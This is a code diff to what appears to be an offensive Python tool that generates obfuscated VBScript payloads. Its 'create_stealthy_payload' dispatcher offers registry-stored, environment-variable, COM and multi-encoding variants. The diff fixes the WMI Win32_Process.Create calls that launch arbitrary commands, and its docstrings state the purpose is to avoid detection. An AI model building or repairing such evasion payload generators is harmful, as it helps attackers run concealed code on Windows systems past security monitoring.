@@ -62,10 +62,12 @@ class AdvancedVBSObfuscation:
     def create_method_invocation_chain(command: str) -> str:
         """Use method chaining and indirect object creation to avoid detection"""
         vbs_code = f"""
-Dim objShell
-Set objShell = GetObject("winmgmts:").ExecMethod("Win32_Process", "Create")
-objShell(Array("{command}", , , 0, ""))
-Set objShell = Nothing
+Dim objWMIService, objProcess, intReturn
+Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
+Set objProcess = objWMIService.Get("Win32_Process")
+intReturn = objProcess.Create("{command}", Null, Null, intProcessID)
+Set objProcess = Nothing
+Set objWMIService = Nothing
 """
         return vbs_code.strip()
 
@@ -111,7 +113,7 @@ Set WshShell = Nothing
         vbs_code = f"""
 Dim strComputer, objWMI, objProcess, errReturn
 strComputer = "."
-Set objWMI = GetObject("winmgmts:" & strComputer & "root\\cimv2")
+Set objWMI = GetObject("winmgmts:" & strComputer & "\\root\\cimv2")
 Set objProcess = objWMI.Get("Win32_Process")
 errReturn = objProcess.Create("{command}")
 Set objProcess = Nothing
@@ -267,7 +269,7 @@ def create_stealthy_payload(
     - registry: Registry-stored payload
     - env: Environment variable obfuscation
     - com: COM object variation
-    - multi: Multiple encoding layers
+    - multi / multi_encoding: Multiple encoding layers
     """
 
     obfuscation = AdvancedVBSObfuscation()
@@ -280,7 +282,7 @@ def create_stealthy_payload(
         return obfuscation.create_environment_variable_decoder(command)
     elif technique == "com":
         return obfuscation.create_com_object_obfuscation(command)
-    elif technique == "multi":
+    elif technique in ("multi", "multi_encoding"):
         return obfuscation.create_multi_encoding_chain(command)
     elif technique == "obfuscated_calls":
         return obfuscation.create_obfuscated_function_calls(command)
